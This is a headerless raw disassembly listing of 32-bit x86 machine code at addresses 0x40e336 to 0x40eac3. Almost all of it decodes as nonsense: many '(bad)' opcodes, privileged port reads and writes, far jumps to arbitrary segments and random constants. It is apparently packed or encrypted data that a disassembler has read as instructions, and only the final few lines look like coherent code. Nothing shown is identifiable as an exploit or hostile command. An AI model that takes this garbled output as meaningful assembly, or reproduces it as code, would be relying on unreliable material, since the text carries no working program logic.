  40e336:	cmp    al,0xdb
  40e338:	lock dec esp
  40e33a:	or     edx,edi
  40e33c:	call   0x8468e8ae
  40e341:	out    0x2b,eax
  40e343:	fldenv [edi-0x58]
  40e346:	mov    dh,0xf9
  40e348:	(bad)  
  40e349:	lea    edx,[edi+0x5b3e2b7b]
  40e34f:	sahf   
  40e350:	outs   dx,BYTE PTR ds:[esi]
  40e351:	inc    eax
  40e352:	adc    esp,DWORD PTR [esp+ebp*2]
  40e355:	pop    ebp
  40e356:	stc    
  40e357:	icebp  
  40e358:	(bad)  
  40e35a:	pop    edi
  40e35b:	push   esi
  40e35c:	scas   eax,DWORD PTR es:[edi]
  40e35d:	add    al,0xf7
  40e35f:	cmp    al,0xa0
  40e361:	ficomp DWORD PTR ss:[edi-0x6]
  40e365:	ja     0x40e369
  40e367:	xchg   esi,eax
  40e368:	sbb    al,0x84
  40e36a:	(bad)  
  40e36c:	jl     0x40e348
  40e36e:	add    al,0x51
  40e370:	fldenv [eax+0x1a]
  40e373:	shl    DWORD PTR [edx-0x14],0x3b
  40e377:	mov    ds:0x7ea7945,al
  40e37c:	adc    dh,dl
  40e37e:	inc    esi
  40e37f:	mov    ch,0xb5
  40e381:	loope  0x40e374
  40e383:	mov    ds:0x7893546a,al
  40e388:	jge    0x40e319
  40e38a:	or     BYTE PTR [ecx+ebx*8+0x44],0x81
  40e38f:	or     ch,BYTE PTR [ecx+0x7b264be6]
  40e395:	jg     0x40e3dc
  40e397:	pop    esi
  40e398:	rcr    DWORD PTR [ebx-0x57],1
  40e39b:	jns    0x40e396
  40e39d:	xchg   DWORD PTR [edx-0x2cf26b49],eax
  40e3a3:	pusha  
  40e3a4:	sub    BYTE PTR [edi],ah
  40e3a6:	aad    0xae
  40e3a8:	stc    
  40e3a9:	dec    esp
  40e3aa:	lahf   
  40e3ab:	ret    0xd3ba
  40e3ae:	jno    0x40e381
  40e3b0:	xor    BYTE PTR [ebx+0x6386538d],bl
  40e3b6:	cld    
  40e3b7:	mov    al,ds:0xb8177d9c
  40e3bc:	sub    eax,0x821e7470
  40e3c1:	push   ebp
  40e3c2:	in     al,0x3a
  40e3c4:	lods   eax,DWORD PTR ds:[esi]
  40e3c5:	dec    ecx
  40e3c6:	xor    eax,0xa99fd2b7
  40e3cb:	push   es
  40e3cc:	mov    ebx,0x23646617
  40e3d1:	imul   eax,DWORD PTR [edi+0x44],0xffffffec
  40e3d5:	and    esp,DWORD PTR [esi-0x4df5efac]
  40e3db:	push   ecx
  40e3dc:	push   0x6b
  40e3de:	add    eax,0x62ff4461
  40e3e3:	(bad)
  40e3e8:	cmp    al,BYTE PTR [ebx+0x7ad8cf37]
  40e3ee:	ja     0x40e449
  40e3f0:	push   ss
  40e3f1:	push   esi
  40e3f2:	ret    0xb52c
  40e3f5:	add    ebp,ecx
  40e3f7:	cwde   
  40e3f8:	jbe    0x40e3b8
  40e3fa:	fldenv [edx-0x1a]
  40e3fd:	jg     0x40e40a
  40e3ff:	cmp    ecx,DWORD PTR [ebx-0x17]
  40e402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e404:	sbb    BYTE PTR [edx+0x5a],bh
  40e407:	aad    0x4e
  40e409:	scas   eax,DWORD PTR es:[edi]
  40e40a:	test   al,0x1b
  40e40c:	shr    DWORD PTR [edi-0x66fd84b4],1
  40e412:	arpl   WORD PTR [edx-0x773ec0e9],sp
  40e418:	clc    
  40e419:	das    
  40e41a:	and    BYTE PTR [edx-0x731ebb04],dl
  40e420:	test   al,0x3f
  40e422:	ds xchg esi,eax
  40e424:	xchg   edx,eax
  40e425:	loope  0x40e44f
  40e427:	enter  0xe6e,0x39
  40e42b:	adc    eax,0xc65b3bc
  40e430:	jge    0x40e407
  40e432:	repz cmp DWORD PTR [ebp-0x1a34be47],esi
  40e439:	adc    bl,BYTE PTR [ecx+0x330a59f3]
  40e43f:	inc    eax
  40e440:	mov    es,ebp
  40e442:	cld    
  40e443:	inc    edi
  40e444:	repnz inc ecx
  40e446:	jns    0x40e491
  40e448:	push   ds
  40e449:	pop    ecx
  40e44a:	aas    
  40e44b:	inc    edx
  40e44c:	bound  eax,QWORD PTR [edi-0x3db03911]
  40e452:	jg     0x40e417
  40e454:	neg    BYTE PTR [edi]
  40e456:	jmp    0x40e3f5
  40e458:	mov    edx,0x5328385
  40e45d:	test   DWORD PTR [ecx+0x6f769646],0xc6607845
  40e467:	stc    
  40e468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e469:	sbb    eax,0x2bb2c360
  40e46e:	push   ds
  40e46f:	sbb    eax,DWORD PTR [edi]
  40e471:	jne    0x40e4d9
  40e473:	sbb    BYTE PTR [esi],bl
  40e475:	dec    ecx
  40e476:	(bad)  
  40e477:	mov    ebx,0x6839151e
  40e47c:	dec    ecx
  40e47d:	aas    
  40e47e:	mov    bl,BYTE PTR [ebp-0x4ecbd5ab]
  40e484:	cmp    ebx,DWORD PTR ds:0x85f512c
  40e48a:	inc    ebp
  40e48b:	aam    0xe7
  40e48d:	cmp    ah,BYTE PTR [ecx]
  40e48f:	bound  esi,QWORD PTR [edi-0x3255c854]
  40e495:	out    dx,eax
  40e496:	mov    WORD PTR [ebp+0x5466192a],ss
  40e49c:	add    esi,DWORD PTR [ecx+0x79]
  40e49f:	les    esi,FWORD PTR [esp+edi*2+0x55]
  40e4a3:	xchg   esp,eax
  40e4a4:	call   0x2b8c1972
  40e4a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4aa:	push   es
  40e4ab:	sti    
  40e4ac:	jno    0x40e4c0
  40e4ae:	mov    edi,0xb75553e9
  40e4b3:	mov    esi,0xf64e8776
  40e4b8:	jl     0x40e506
  40e4ba:	add    DWORD PTR [esi+0x3958d79c],0xffffffba
  40e4c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4c2:	cs inc ecx
  40e4c4:	sbb    BYTE PTR [edi+0x3b7ceec7],dh
  40e4ca:	ds push eax
  40e4cc:	mov    ch,0xef
  40e4ce:	idiv   dh
  40e4d0:	add    eax,0x98d9e373
  40e4d5:	mov    dh,0x3
  40e4d7:	xor    ecx,DWORD PTR [esi-0x60015ebb]
  40e4dd:	sbb    al,0x7b
  40e4df:	mov    edx,ebp
  40e4e1:	dec    edx
  40e4e2:	mov    ecx,0x13eb27f6
  40e4e7:	jmp    0x40e504
  40e4e9:	mov    esi,DWORD PTR [esi-0x2998934e]
  40e4ef:	sub    ecx,esp
  40e4f1:	sub    eax,0x7bb19dcf
  40e4f6:	and    edx,DWORD PTR [edx+eax*4+0x28]
  40e4fa:	sbb    BYTE PTR ss:0x63e15743,bl
  40e501:	sbb    bh,bl
  40e503:	inc    esp
  40e504:	xchg   ecx,eax
  40e505:	xor    edi,DWORD PTR [eax*2-0x2395441f]
  40e50c:	sbb    ch,BYTE PTR [ebx+0x4]
  40e50f:	lds    edi,FWORD PTR [ebp+0x2a]
  40e512:	mov    ah,0x93
  40e514:	and    DWORD PTR [edi],ebx
  40e516:	daa    
  40e517:	aas    
  40e518:	sbb    BYTE PTR [ebx],ch
  40e51a:	fxch   st(4)
  40e51c:	scas   eax,DWORD PTR es:[edi]
  40e51d:	jmp    0x40e4c9
  40e51f:	jae    0x40e4db
  40e521:	(bad)  
  40e522:	jae    0x40e507
  40e524:	xchg   edi,eax
  40e525:	dec    ebx
  40e526:	in     eax,0xbd
  40e528:	mov    al,ds:0x3a62479e
  40e52d:	jmp    0x35a6:0x63d63412
  40e534:	daa    
  40e535:	in     eax,0x2d
  40e537:	inc    esp
  40e538:	sbb    BYTE PTR [eax],0x80
  40e53b:	loop   0x40e4dd
  40e53d:	stc    
  40e53e:	(bad)  
  40e53f:	push   edi
  40e540:	popa   
  40e541:	nop
  40e542:	sbb    cl,BYTE PTR [esi+0x3b1d2b9a]
  40e548:	test   dl,bl
  40e54a:	int3   
  40e54b:	sub    edx,DWORD PTR [ebx-0xb47cd44]
  40e551:	cld    
  40e552:	mov    dl,0xbe
  40e554:	and    esi,edx
  40e556:	pop    esp
  40e557:	sub    edx,eax
  40e559:	imul   esp,DWORD PTR [edi],0x55bc12a2
  40e55f:	inc    ebx
  40e560:	jno    0x40e536
  40e562:	push   0x77228c26
  40e567:	in     al,0xac
  40e569:	push   0x63cd8114
  40e56e:	cdq    
  40e56f:	adc    al,0x77
  40e571:	mov    esp,0x7bdcd202
  40e576:	test   DWORD PTR [edi-0x4fa481ca],0xba14a205
  40e580:	pop    ebx
  40e581:	mov    ds:0xc69bdf31,eax
  40e586:	inc    ebp
  40e587:	push   esp
  40e588:	jmp    0x238e:0x166f314c
  40e58f:	sbb    eax,0xb8c325cd
  40e594:	pop    ebp
  40e595:	mov    al,ds:0x3df2fca
  40e59a:	pop    ss
  40e59b:	int3   
  40e59c:	mov    dl,0x32
  40e59e:	mov    cl,BYTE PTR [esi]
  40e5a0:	pop    edx
  40e5a1:	fs mov cl,0xb9
  40e5a4:	addr16 cdq 
  40e5a6:	ror    BYTE PTR [esi],0x99
  40e5a9:	jbe    0x40e539
  40e5ab:	cmp    eax,0xcdc3c07e
  40e5b0:	pusha  
  40e5b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5b2:	jl     0x40e5c9
  40e5b4:	push   0xffffff9b
  40e5b6:	int    0xc0
  40e5b8:	add    eax,0xeb329b5d
  40e5bd:	xor    al,0xc1
  40e5bf:	xor    bl,dh
  40e5c1:	movntq QWORD PTR [edi+edi*1+0x3b47a7e4],mm5
  40e5c9:	in     al,dx
  40e5ca:	test   al,0x6c
  40e5cc:	sahf   
  40e5cd:	loop   0x40e5db
  40e5cf:	fdivr  QWORD PTR fs:[edx]
  40e5d2:	fnstcw WORD PTR [esi-0x6e]
  40e5d5:	mov    dh,0x78
  40e5d7:	push   edi
  40e5d8:	add    cl,BYTE PTR [edi]
  40e5da:	es int 0x85
  40e5dd:	mov    DWORD PTR [edi-0x16ea478b],edi
  40e5e3:	dec    ecx
  40e5e4:	mov    DWORD PTR [esi+edi*2-0x6537a676],eax
  40e5eb:	mov    WORD PTR [esi],gs
  40e5ed:	pusha  
  40e5ee:	mov    ds:0x5f564b14,al
  40e5f3:	jl     0x40e62e
  40e5f5:	mov    BYTE PTR [ecx-0x7],0xd6
  40e5f9:	(bad)
  40e5fc:	mov    al,ds:0xa748e1c9
  40e601:	(bad)  [esi+ebx*2-0x6f]
  40e605:	test   al,0xc8
  40e607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e608:	arpl   WORD PTR [edx+0x3d],cx
  40e60b:	xor    al,0x28
  40e60d:	sbb    edx,eax
  40e60f:	mov    ebx,0x6d979b97
  40e614:	test   ch,ch
  40e616:	push   0x3ab437a
  40e61b:	sub    bl,bh
  40e61d:	mov    ebp,0xfb3e27d5
  40e622:	mov    ds:0x8758ad36,eax
  40e627:	retf   
  40e628:	pop    ds
  40e629:	rol    BYTE PTR [ecx-0x24],cl
  40e62c:	xchg   esp,eax
  40e62d:	test   DWORD PTR [ebx-0x7e552ebc],eax
  40e633:	div    BYTE PTR [edi-0x7e527b6]
  40e639:	and    eax,0xed02784d
  40e63e:	sub    eax,0xf19af983
  40e643:	jmp    0x4f4c:0xebdd91f4
  40e64a:	nop    DWORD PTR [ebx+eax*2]
  40e64e:	ffreep st(0)
  40e650:	aas    
  40e651:	add    al,0x2
  40e653:	and    ecx,DWORD PTR [edx+0x50ec2893]
  40e659:	dec    ecx
  40e65a:	pusha  
  40e65b:	loope  0x40e6b5
  40e65d:	in     al,0x36
  40e65f:	adc    eax,0xe5725458
  40e664:	mov    ecx,0xb8f25c00
  40e669:	jo     0x40e603
  40e66b:	mov    DWORD PTR [ebx-0x65],0x7827b4b3
  40e672:	jbe    0x40e6c6
  40e674:	sub    bl,ah
  40e676:	mov    bl,BYTE PTR [eax]
  40e678:	outs   dx,DWORD PTR ds:[esi]
  40e679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e67a:	jo     0x40e62a
  40e67c:	push   ecx
  40e67d:	sbb    edi,DWORD PTR [esi+0x23f42b32]
  40e683:	adc    ah,BYTE PTR [esi]
  40e685:	jbe    0x40e615
  40e687:	daa    
  40e688:	push   es
  40e689:	and    ch,bh
  40e68b:	sbb    al,BYTE PTR [edx]
  40e68d:	adc    al,0xd4
  40e68f:	imul   ebx
  40e691:	and    ebp,DWORD PTR [ecx]
  40e693:	jge    0x40e684
  40e695:	mov    ds:0xbb605093,eax
  40e69a:	pusha  
  40e69b:	mov    ebp,0x1cecc099
  40e6a0:	fs inc edx
  40e6a2:	(bad)  
  40e6a3:	shr    DWORD PTR ds:0x718fd348,cl
  40e6a9:	es cmp bl,bl
  40e6ac:	and    eax,0x2f8f78a0
  40e6b1:	cmp    DWORD PTR [eax+0x0],ebp
  40e6b4:	je     0x40e729
  40e6b6:	rcl    BYTE PTR [ebx],1
  40e6b8:	sbb    DWORD PTR [esi-0x4c],esi
  40e6bb:	sub    DWORD PTR [edi+0x44],edx
  40e6be:	leave  
  40e6bf:	mov    esi,edi
  40e6c1:	lods   al,BYTE PTR ds:[esi]
  40e6c2:	fild   QWORD PTR [ebp-0x30a18bef]
  40e6c8:	in     eax,0x6
  40e6ca:	fldcw  WORD PTR [ebx-0x7eecf550]
  40e6d0:	inc    esp
  40e6d1:	ds ins BYTE PTR es:[edi],dx
  40e6d3:	enter  0x890b,0x1
  40e6d7:	jmp    0x40ea9d
  40e6dc:	or     ebp,DWORD PTR [edx+0x67]
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e6d7
  40e6e9:	mov    edx,DWORD PTR [ebx+0x7ca16cb3]
  40e6ef:	jl     0x40e698
  40e6f1:	jns    0x40e76f
  40e6f3:	jl     0x40e67b
  40e6f5:	pop    edx
  40e6f6:	push   es
  40e6f7:	mov    edi,DWORD PTR [si]
  40e6fa:	mov    ecx,0x8dbad9d5
  40e6ff:	inc    esp
  40e700:	sar    DWORD PTR [ebx+0xffe5226],cl
  40e706:	enter  0x368,0xbd
  40e70a:	pop    ebx
  40e70b:	push   DWORD PTR [ebx]
  40e70d:	pop    ecx
  40e70e:	retf   0x9d15
  40e711:	aam    0x16
  40e713:	outs   dx,BYTE PTR ds:[esi]
  40e714:	xchg   edx,eax
  40e715:	inc    ebp
  40e716:	mov    ecx,0x8ab745e9
  40e71b:	test   eax,0x9d09976e
  40e720:	mov    eax,ds:0xc4e968a8
  40e725:	push   edi
  40e726:	ret    0x645
  40e729:	cs jae 0x40e706
  40e72c:	mov    al,0x1e
  40e72e:	xchg   dh,ah
  40e730:	(bad)  
  40e731:	or     esp,DWORD PTR [ebp+0x25]
  40e734:	iret   
  40e735:	imul   ebp,DWORD PTR [ecx-0xc72c652],0xffffff84
  40e73c:	and    eax,0x2d55909f
  40e741:	test   al,0x2e
  40e743:	aas    
  40e744:	add    eax,0xd16b63f9
  40e749:	jmp    0x40e71b
  40e74b:	cmp    eax,0xf4cb7190
  40e750:	add    cl,BYTE PTR [edi]
  40e752:	rcr    ah,cl
  40e754:	in     eax,0xee
  40e756:	repnz mov eax,DWORD PTR [eax-0x72]
  40e75a:	mov    dh,0x92
  40e75c:	fcom   QWORD PTR [edi-0x30d2728f]
  40e762:	pop    ebp
  40e763:	cdq    
  40e764:	pop    esi
  40e765:	sub    BYTE PTR [ecx+0x58],al
  40e768:	pop    ds
  40e769:	not    DWORD PTR [ebp-0x2f]
  40e76c:	xlat   BYTE PTR ds:[ebx]
  40e76d:	je     0x40e790
  40e76f:	adc    bh,BYTE PTR [edi]
  40e771:	es sbb al,0xc0
  40e774:	(bad)  
  40e776:	into   
  40e777:	push   ebx
  40e778:	cmp    eax,0x3db2e6a1
  40e77d:	push   ss
  40e77e:	into   
  40e77f:	adc    al,0xcb
  40e781:	in     al,0x4e
  40e783:	sbb    al,0x62
  40e785:	mov    dh,0x41
  40e787:	lods   eax,DWORD PTR ds:[esi]
  40e788:	cmc    
  40e789:	xchg   DWORD PTR cs:[eax+0x955ecbd],eax
  40e790:	(bad)  
  40e791:	cmp    BYTE PTR [ecx+0x42cd8355],cl
  40e797:	hlt    
  40e798:	xchg   BYTE PTR [ebx],cl
  40e79a:	sahf   
  40e79b:	push   ebp
  40e79c:	or     al,BYTE PTR [esi-0x24db1ae1]
  40e7a2:	loop   0x40e734
  40e7a4:	fs pop ebp
  40e7a6:	arpl   WORD PTR [edi-0x8],bx
  40e7a9:	sub    eax,edi
  40e7ab:	cmp    ecx,DWORD PTR [esi]
  40e7ad:	loop   0x40e755
  40e7af:	outs   dx,BYTE PTR ds:[esi]
  40e7b0:	aaa    
  40e7b1:	daa    
  40e7b2:	sub    DWORD PTR fs:[ecx],ebp
  40e7b5:	in     eax,0x41
  40e7b7:	jae    0x40e776
  40e7b9:	add    dh,BYTE PTR [ecx+0x6]
  40e7bc:	push   ss
  40e7bd:	xchg   bh,ah
  40e7bf:	jno    0x40e83e
  40e7c1:	pop    ebx
  40e7c2:	xor    dh,BYTE PTR [eax+0x4e67bd21]
  40e7c8:	pop    edi
  40e7c9:	arpl   WORD PTR [eax-0x29],di
  40e7cc:	ss in  eax,dx
  40e7ce:	stc    
  40e7cf:	pop    ds
  40e7d0:	mov    ebx,0x5a451fd6
  40e7d5:	shr    edi,cl
  40e7d7:	xchg   edx,eax
  40e7d8:	mov    bl,0x7b
  40e7da:	jg     0x40e7a3
  40e7dc:	jmp    0x2d18:0x2e6ed0dc
  40e7e3:	out    0x25,eax
  40e7e5:	dec    esi
  40e7e6:	mov    esp,0x5d0e5a4c
  40e7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7ec:	mov    ebx,0x6fed6350
  40e7f1:	scas   eax,DWORD PTR es:[edi]
  40e7f2:	hlt    
  40e7f3:	xchg   DWORD PTR [ebx-0x1169d8db],esp
  40e7f9:	popa   
  40e7fa:	jns    0x40e7e7
  40e7fc:	dec    esi
  40e7fd:	sbb    al,0x25
  40e7ff:	xor    eax,edi
  40e801:	or     al,0x0
  40e803:	stos   BYTE PTR es:[edi],al
  40e804:	out    dx,eax
  40e805:	outs   dx,DWORD PTR ds:[esi]
  40e806:	or     ah,BYTE PTR [edi-0x943bf92]
  40e80c:	outs   dx,BYTE PTR ds:[esi]
  40e80d:	out    0x8f,eax
  40e80f:	push   esp
  40e810:	lods   al,BYTE PTR ds:[esi]
  40e811:	and    al,0x56
  40e813:	out    dx,al
  40e814:	ins    DWORD PTR es:[edi],dx
  40e815:	arpl   bx,sp
  40e817:	adc    edx,0xc6420585
  40e81d:	mov    gs,esi
  40e81f:	push   es
  40e820:	clc    
  40e821:	sti    
  40e822:	dec    edi
  40e823:	(bad)  
  40e824:	jp     0x40e7e1
  40e826:	inc    edx
  40e827:	xchg   esi,ebp
  40e829:	mov    edx,0xafa3e151
  40e82e:	mov    edi,0xf7e63266
  40e833:	dec    eax
  40e834:	cwde   
  40e835:	sti    
  40e836:	rol    BYTE PTR [ecx-0x79],0x9e
  40e83a:	sub    al,0x4b
  40e83c:	pop    ebp
  40e83d:	rol    DWORD PTR [edi],0xfd
  40e840:	retf   0xe52d
  40e843:	test   dl,cl
  40e845:	xchg   ebp,eax
  40e846:	in     al,dx
  40e847:	les    esi,FWORD PTR ds:0x55769fb0
  40e84d:	cmp    ch,dl
  40e84f:	out    dx,al
  40e850:	mov    ebp,0xadcbc8c7
  40e855:	mov    es,WORD PTR [esi+0x55]
  40e858:	sub    al,0x65
  40e85a:	lock pop ss
  40e85c:	mov    esp,0x4ea8b280
  40e861:	pop    eax
  40e862:	and    al,0x40
  40e864:	sbb    eax,0x6e977c23
  40e869:	push   esi
  40e86a:	push   ebp
  40e86b:	push   esi
  40e86c:	mov    bl,0x3b
  40e86e:	cli    
  40e86f:	mov    ds:0x7839640d,eax
  40e874:	out    0x13,al
  40e876:	call   0xa373:0x17b591fc
  40e87d:	retf   0x63fd
  40e880:	in     al,dx
  40e881:	mov    ds:0xeae2c98e,al
  40e886:	sub    bh,BYTE PTR [eax]
  40e888:	pop    ebp
  40e889:	mov    bl,0x8
  40e88b:	push   0xffffffa7
  40e88d:	into   
  40e88e:	inc    ebp
  40e88f:	add    cl,dl
  40e891:	aam    0x28
  40e893:	sub    DWORD PTR [esi+0x3d],ebx
  40e896:	push   cs
  40e897:	or     BYTE PTR [ecx],ah
  40e899:	int3   
  40e89a:	sbb    cl,bh
  40e89c:	je     0x40e847
  40e89e:	fcom   DWORD PTR [ebx-0xa9d4a]
  40e8a4:	call   0xb2c8:0x94a31307
  40e8ab:	sub    eax,0x59b4ace9
  40e8b0:	bound  ebx,QWORD PTR [ebx-0x76f74e61]
  40e8b6:	mov    ah,0x88
  40e8b8:	push   es
  40e8b9:	xchg   ebx,eax
  40e8ba:	loope  0x40e934
  40e8bc:	fs call 0x70fc:0xfab8deed
  40e8c4:	cwde   
  40e8c5:	test   BYTE PTR [ecx],ah
  40e8c7:	jne    0x40e869
  40e8c9:	push   edx
  40e8ca:	push   ebx
  40e8cb:	xchg   ecx,eax
  40e8cc:	enter  0x125b,0x67
  40e8d0:	(bad)  
  40e8d1:	pop    ecx
  40e8d2:	jp     0x40e8cd
  40e8d4:	stos   DWORD PTR es:[edi],eax
  40e8d5:	and    esi,DWORD PTR [ebp+0x1dba85af]
  40e8db:	xor    ecx,ebp
  40e8dd:	ds scas al,BYTE PTR es:[edi]
  40e8df:	mov    esi,es
  40e8e1:	retf   
  40e8e2:	sbb    eax,0x92ad2191
  40e8e7:	pop    ebp
  40e8e8:	xchg   DWORD PTR [esi+0x55fe17e2],esi
  40e8ee:	fidiv  DWORD PTR [ebx]
  40e8f0:	rcr    esp,1
  40e8f2:	or     ebx,DWORD PTR [ebp+0x67]
  40e8f5:	call   0x2705:0xc96faff3
  40e8fc:	sub    dh,BYTE PTR [edx+eax*1-0x61]
  40e900:	jb     0x40e944
  40e902:	pusha  
  40e903:	sbb    ch,BYTE PTR [edx+ebx*2]
  40e906:	or     eax,DWORD PTR [esi-0x4dd87400]
  40e90c:	mov    eax,DWORD PTR [edi-0x7c]
  40e90f:	sbb    DWORD PTR [edi+0x67ebca34],ecx
  40e915:	sahf   
  40e916:	outs   dx,BYTE PTR ds:[esi]
  40e917:	or     dh,BYTE PTR [esi-0x70]
  40e91a:	out    0xae,eax
  40e91c:	inc    ebx
  40e91d:	pushf  
  40e91e:	adc    DWORD PTR [edi],ebx
  40e920:	dec    ebx
  40e921:	cmp    DWORD PTR [edi+0x43],edx
  40e924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e925:	scas   al,BYTE PTR es:[edi]
  40e926:	int    0x0
  40e928:	mov    ds:0xb39c122f,al
  40e92d:	inc    edx
  40e92e:	cdq    
  40e92f:	mov    edx,0x93317805
  40e934:	mov    al,ds:0x67d13199
  40e939:	scas   eax,DWORD PTR es:[edi]
  40e93a:	cld    
  40e93b:	mov    bl,0x70
  40e93d:	xchg   esi,eax
  40e93e:	pop    edi
  40e93f:	pop    esi
  40e940:	add    BYTE PTR [eax-0x4dcc29c1],bl
  40e946:	and    al,0x75
  40e948:	pop    esi
  40e949:	mov    al,0x83
  40e94b:	ins    DWORD PTR es:[edi],dx
  40e94c:	inc    ecx
  40e94d:	pop    ecx
  40e94e:	adc    bl,BYTE PTR [esi+0xf]
  40e951:	inc    edi
  40e952:	or     BYTE PTR [ecx-0x43],bh
  40e955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e956:	pusha  
  40e957:	loopne 0x40e92a
  40e959:	sbb    cl,al
  40e95b:	sub    ecx,eax
  40e95d:	cld    
  40e95e:	add    ah,bh
  40e960:	xchg   esi,eax
  40e961:	or     eax,0x772af192
  40e966:	mov    esp,0x2c1d0ba0
  40e96b:	retf   
  40e96c:	mov    bl,0xd2
  40e96e:	fxch   st(6)
  40e970:	std    
  40e971:	jg     0x40e91f
  40e973:	popf   
  40e974:	dec    ecx
  40e975:	int    0x58
  40e977:	adc    cl,dl
  40e979:	mov    esp,0xd146c703
  40e97e:	jno    0x40e96f
  40e980:	jmp    0xe8b50522
  40e985:	aam    0x85
  40e987:	mov    ecx,DWORD PTR [esi]
  40e989:	inc    ebp
  40e98a:	(bad)  
  40e98c:	cmp    dh,BYTE PTR [ebp+0x1f]
  40e98f:	call   0x1ca41fbc
  40e994:	scas   al,BYTE PTR es:[edi]
  40e995:	cmp    eax,DWORD PTR [ecx+0x3f927c3f]
  40e99b:	inc    edx
  40e99c:	fs jl  0x40e99c
  40e99f:	xchg   ebp,eax
  40e9a0:	mov    dh,0xcf
  40e9a2:	push   ds
  40e9a3:	rcl    BYTE PTR [ebx+ebx*4-0x40],cl
  40e9a7:	dec    eax
  40e9a8:	pop    edx
  40e9a9:	or     dl,dh
  40e9ab:	loopne 0x40e99b
  40e9ad:	inc    edi
  40e9ae:	iret   
  40e9af:	lea    eax,[edx+0x3d]
  40e9b2:	xor    al,0x86
  40e9b4:	cwde   
  40e9b5:	xor    BYTE PTR [ebp-0x79],al
  40e9b8:	jae    0x40e969
  40e9ba:	cmp    DWORD PTR [ebp+0x14],ecx
  40e9bd:	int    0x1b
  40e9bf:	icebp  
  40e9c0:	xchg   edx,eax
  40e9c1:	pop    es
  40e9c2:	push   es
  40e9c3:	in     al,0x42
  40e9c5:	add    al,0x20
  40e9c7:	adc    eax,0x94c9706
  40e9cc:	shr    BYTE PTR [edx],cl
  40e9ce:	push   0x5d
  40e9d0:	adc    ah,BYTE PTR [eax]
  40e9d2:	push   ecx
  40e9d3:	inc    ebx
  40e9d4:	adc    edx,DWORD PTR [esi-0xc]
  40e9d7:	shl    BYTE PTR [esi+0x55],1
  40e9da:	dec    esi
  40e9db:	cli    
  40e9dc:	(bad)  
  40e9de:	inc    ecx
  40e9df:	or     ecx,DWORD PTR [eax-0x18a50095]
  40e9e5:	(bad)  
  40e9e6:	push   ebp
  40e9e7:	mov    esp,eax
  40e9e9:	pop    es
  40e9ea:	adc    BYTE PTR [edi+0x386d52f],dh
  40e9f0:	mov    ch,0x84
  40e9f2:	jecxz  0x40e99a
  40e9f4:	jg     0x40e979
  40e9f6:	(bad)  
  40e9f7:	jle    0x40ea4a
  40e9f9:	dec    esi
  40e9fa:	(bad)  
  40e9fb:	das    
  40e9fc:	push   es
  40e9fd:	and    esp,DWORD PTR [ebx+ebx*8+0x142baf17]
  40ea04:	push   ebx
  40ea05:	(bad)  
  40ea06:	lock xor BYTE PTR [ebp+0x1a],0x4c
  40ea0b:	cmp    al,0xb2
  40ea0d:	test   BYTE PTR [edi+0x5f6bd00e],bl
  40ea13:	stos   BYTE PTR es:[edi],al
  40ea14:	cmc    
  40ea15:	xor    BYTE PTR [edx+0x758fff93],0x13
  40ea1c:	jecxz  0x40e9eb
  40ea1e:	mov    ch,0x6c
  40ea20:	(bad)  
  40ea22:	mov    dl,0x75
  40ea24:	loop   0x40e9ac
  40ea26:	sub    ebp,DWORD PTR [ecx]
  40ea28:	push   edx
  40ea29:	loopne 0x40e9cf
  40ea2b:	in     eax,0x19
  40ea2d:	mov    dl,0x86
  40ea2f:	lods   al,BYTE PTR ds:[esi]
  40ea30:	hlt    
  40ea31:	cli    
  40ea32:	pop    esp
  40ea33:	cmp    al,0xf5
  40ea35:	push   ss
  40ea36:	(bad)  
  40ea37:	pop    esp
  40ea38:	inc    ebp
  40ea39:	int    0xc7
  40ea3b:	stos   DWORD PTR es:[edi],eax
  40ea3c:	sub    bl,BYTE PTR [ecx-0x20380d45]
  40ea42:	aam    0x68
  40ea44:	mov    esp,0x5ae5f4e4
  40ea49:	loopne 0x40ea75
  40ea4b:	jle    0x40ea47
  40ea4d:	addr16 in al,0xda
  40ea50:	in     eax,0x92
  40ea52:	and    esi,DWORD PTR [ebx+ebx*1-0xb]
  40ea56:	lahf   
  40ea57:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40ea59:	xchg   esi,eax
  40ea5a:	sbb    esp,esp
  40ea5c:	add    eax,0xa89d285e
  40ea61:	xlat   BYTE PTR ds:[ebx]
  40ea62:	cmp    ecx,ecx
  40ea64:	add    BYTE PTR [edx+0x4b],0xc7
  40ea68:	and    bh,BYTE PTR [edi+0x3583e600]
  40ea6e:	(bad)  [edi-0x24]
  40ea71:	cmp    edi,DWORD PTR [edi+0xa]
  40ea74:	inc    ebp
  40ea75:	sub    BYTE PTR fs:[eax-0x7d],bl
  40ea79:	hlt    
  40ea7a:	jl     0x40ea57
  40ea7c:	xor    eax,DWORD PTR [eax-0x659581d5]
  40ea82:	dec    edx
  40ea83:	dec    edi
  40ea84:	mov    ch,0x40
  40ea86:	jl     0x40ea42
  40ea88:	sbb    DWORD PTR [edi+ebx*2],esi
  40ea8b:	sahf   
  40ea8c:	push   eax
  40ea8d:	out    0xf6,al
  40ea8f:	mov    esi,DWORD PTR [edx-0x6fc6a815]
  40ea95:	loope  0x40ea33
  40ea97:	mov    DWORD PTR [edi-0x2],ecx
  40ea9a:	xchg   esp,eax
  40ea9b:	cmp    DWORD PTR [ebp-0x1607ba75],ecx
  40eaa1:	les    eax,FWORD PTR [edi]
  40eaa3:	add    BYTE PTR [eax],al
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
  40eaba:	xor    eax,edi
  40eabc:	add    eax,esi
  40eabe:	jmp    0x40ee84
  40eac3:	icebp  
